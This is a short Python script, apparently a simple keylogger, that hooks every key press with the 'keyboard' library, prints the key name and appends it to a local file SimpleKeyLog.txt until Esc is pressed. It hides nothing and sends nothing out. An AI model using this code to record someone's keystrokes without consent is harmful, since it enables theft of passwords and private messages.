import keyboard

def onPress(key):  
    if hasattr(key, 'name'):
        print(key.name)
        with open('SimpleKeyLog.txt', 'a') as mem:
            mem.write(key.name)
    else:
        print(repr(key))

if __name__ == "__main__":
    keyboard.on_press(onPress)
    keyboard.wait('esc')
